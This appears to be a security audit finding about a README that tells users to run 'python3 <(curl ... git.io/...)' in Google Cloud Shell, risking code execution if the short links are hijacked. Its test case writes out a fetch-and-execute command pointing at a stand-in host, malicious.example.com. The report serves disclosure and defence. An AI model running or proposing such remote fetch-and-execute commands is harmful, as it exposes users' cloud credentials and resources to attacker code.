- Vulnerability name: `git.io` URL Redirection leading to Arbitrary Code Execution
- Description:
    1. The README.md file provides commands to users for creating service accounts. These commands are intended to be copied and pasted into Google Cloud Shell for execution.
    2. The commands utilize `curl` to download Python scripts from `git.io` URLs and execute them directly using `python3 <(...)`.
    3. `git.io` is a URL shortening service. The project uses these short URLs in the README.md to point to the Python scripts hosted in the repository.
    4. An attacker could potentially compromise the `git.io` URLs. If successful, the attacker can redirect these URLs to point to a malicious Python script hosted on an attacker-controlled server.
    5. When a user follows the instructions in the README.md and copies and pastes the command into their Google Cloud Shell, `curl` will download the malicious script from the attacker's server instead of the intended script from the repository.
    6. Because the command uses `python3 <(...)`, the downloaded malicious script will be executed directly within the user's Google Cloud Shell environment without any prior review or warning.
- Impact:
    Critical. Successful exploitation of this vulnerability allows an attacker to achieve arbitrary code execution within the victim's Google Cloud Shell environment. This can lead to severe consequences, including:
    - Full control of the victim's Google Cloud Shell session.
    - Unauthorized access to sensitive data and resources within the Google Cloud Shell environment and potentially connected Google Cloud projects.
    - Exfiltration of sensitive information, such as credentials, API keys, and конфиденциальные data.
    - Modification or deletion of critical cloud resources.
    - Deployment of malware or backdoors within the victim's cloud environment.
    - Using the compromised Cloud Shell as a launchpad for further attacks on the victim's infrastructure.
- Vulnerability rank: Critical
- Currently implemented mitigations:
    None. The project directly uses `git.io` URLs in the README.md without any mechanisms to verify the integrity or authenticity of the scripts downloaded through these URLs. There are no warnings to the users about the risks of executing scripts from untrusted sources.
- Missing mitigations:
    - Replace `git.io` URLs with direct, full URLs pointing to the raw Python scripts within the GitHub repository itself. This eliminates the dependency on an external URL shortening service and the associated redirection risk. For example, instead of `https://git.io/gwmme-create-service-account`, use the raw GitHub URL to the `gwmme_create_service_account.py` file.
    - Implement Subresource Integrity (SRI) or similar integrity verification mechanisms. If direct URLs are not feasible and URL shortening is still desired, consider using a more secure URL shortening service that offers features like SRI. Alternatively, provide checksums (e.g., SHA256 hashes) of the scripts in the README.md and instruct users to manually verify the checksum of the downloaded script before execution.
    - Add a clear and prominent warning in the README.md about the security risks associated with copying and pasting commands from the internet, especially those involving direct script execution. Advise users to carefully review the content of the script before executing it in their Cloud Shell. Encourage users to download the script first, review it locally, and then execute it if they trust its contents.
- Preconditions:
    - The attacker must successfully compromise or hijack the specified `git.io` URLs ( `https://git.io/gwmme-create-service-account`, `https://git.io/gwm-create-service-account`, `https://git.io/password-sync-create-service-account`).
    - A victim must follow the instructions in the README.md and copy and paste one of the provided commands into their Google Cloud Shell.
    - The victim must execute the pasted command in their Google Cloud Shell, leading to the download and execution of the potentially malicious script.
- Source code analysis:
    - File: `/code/README.md`
        - The README.md file contains instructions for users to create service accounts for different Google Workspace migration tools.
        - In the "Usage" section, for each tool (GWMME, GWM, Password Sync), the README provides a command that users are instructed to copy and paste into their Cloud Shell.
        - For example, for GWMME, the command is:
          ```
          python3 <(curl -s -S -L https://git.io/gwmme-create-service-account)
          ```
        - This command uses `curl` to download the content from the `https://git.io/gwmme-create-service-account` URL. The `-s` flag makes `curl` silent, `-S` shows an error message if it fails, and `-L` makes it follow redirects.
        - The downloaded content is then passed as input to the `python3` interpreter using process substitution `<(...)`. This means the downloaded content is treated as a Python script and executed directly.
        - The URLs `https://git.io/gwmme-create-service-account`, `https://git.io/gwm-create-service-account`, and `https://git.io/password-sync-create-service-account` are all `git.io` short URLs.
        - `git.io` is a public URL shortening service provided by GitHub. While convenient, `git.io` URLs can be a security risk because:
            - **Redirection Risk:** If an attacker gains control over the `git.io` URL, they can change the redirection target to a malicious script without the project owners' knowledge or consent.
            - **Opacity:** Users cannot easily verify the destination of a `git.io` URL before accessing it, making it difficult to detect malicious redirection.
        - The scripts `gwmme_create_service_account.py`, `gwm_create_service_account.py`, and `password_sync_create_service_account.py` are hosted in the repository and are intended to be downloaded and executed. However, the README uses `git.io` short URLs instead of direct links to these scripts.
- Security test case:
    1. **Identify the target `git.io` URLs:** Note the `git.io` URLs provided in the README.md:
        - `https://git.io/gwmme-create-service-account`
        - `https://git.io/gwm-create-service-account`
        - `https://git.io/password-sync-create-service-account`
    2. **Determine the original destination URLs:** Use a URL expansion service or `curl -v` to find the actual URLs these `git.io` links currently redirect to. For example:
       ```bash
       curl -v https://git.io/gwmme-create-service-account 2>&1 | grep Location
       ```
       This will reveal the current target URL, which should be the raw content URL of `gwmme_create_service_account.py` in the GitHub repository.
    3. **Set up a malicious script and server:** Create a simple Python script (e.g., `malicious_script.py`) that demonstrates code execution, such as printing a warning message or creating a file in the `/tmp` directory in Cloud Shell. Host this script on a publicly accessible web server (you can use a simple HTTP server for testing).
    4. **Simulate `git.io` compromise (for testing):**  Since actually compromising `git.io` is likely not feasible, for testing purposes, we will simulate the redirection.  Instead of trying to change the `git.io` redirection, we will modify the command we copy from the README to point to our malicious script directly. Replace the `git.io` URL in the command with the URL of your malicious script hosted on your server. For example, if your malicious script is hosted at `http://malicious.example.com/malicious_script.py`, the modified command would be:
       ```bash
       python3 <(curl -s -S -L http://malicious.example.com/malicious_script.py)
       ```
    5. **Victim execution:**
        - Open Google Cloud Shell.
        - Copy the **modified command** from step 4 (or the original command if you were able to actually compromise the `git.io` URL) and paste it into the Cloud Shell prompt.
        - Press Enter to execute the command.
    6. **Verify malicious code execution:** Observe the output in the Cloud Shell. If the vulnerability is successfully exploited, you should see the output from your `malicious_script.py` (e.g., the warning message you configured or the creation of the test file). This confirms that arbitrary code execution was achieved by redirecting the user from the seemingly harmless command in the README.md to a malicious script.

By following these steps, you can demonstrate the vulnerability and confirm that an attacker could indeed achieve arbitrary code execution by compromising the `git.io` URLs used in the project's README.md.
